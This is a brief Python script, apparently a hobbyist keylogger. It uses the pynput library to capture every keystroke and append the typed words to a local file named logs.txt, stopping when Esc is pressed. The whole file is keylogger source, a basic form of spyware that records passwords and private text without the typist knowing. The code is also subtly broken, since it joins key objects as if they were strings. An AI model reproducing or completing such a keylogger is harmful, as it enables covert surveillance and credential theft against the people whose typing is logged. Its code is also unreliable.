import pynput
import os
from pynput.keyboard import Key, Listener

presses = []

def log_key(key):
    with open("logs.txt", "a") as f:
        word = ""
        word = word.join(presses)
        f.write(word)
        f.write(" ")
        presses.clear() #resetting presses

def on_press(key):
    if key == Key.space or key == Key.enter:
        log_key(key)
    else:
        presses.append(key)

def on_release(key):
    if key == Key.esc:
        return False
        
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()